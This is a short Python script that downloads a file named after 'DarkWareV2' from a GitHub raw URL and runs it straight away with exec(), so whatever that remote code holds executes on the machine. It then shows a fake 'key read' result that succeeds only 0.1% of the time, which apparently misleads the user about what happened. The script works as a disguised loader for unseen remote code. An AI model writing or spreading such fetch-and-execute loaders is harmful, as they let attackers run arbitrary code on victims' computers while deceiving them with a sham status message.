import requests
import random
import tkinter as tk
from tkinter import messagebox

def show_message(message):
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    messagebox.showinfo("Result", message)
    root.destroy()

raw_url = "https://raw.githubusercontent.com/DarkWareV2/DarkWareV2Scripts/main/DarkWareV2Ui.py"

try:
    response = requests.get(raw_url)
    response.raise_for_status()  

    exec(response.text)
    
except requests.RequestException as e:
    show_message(f"Error fetching script: {e}")
    exit(1)

except Exception as e:
    show_message(f"Error executing script: {e}")
    exit(1)

# 0.1% chance to print "key has been successfully read"
if random.random() < 0.001:
    show_message("Key has been successfully read")
else:
    show_message("Key has been unsuccessfully read")
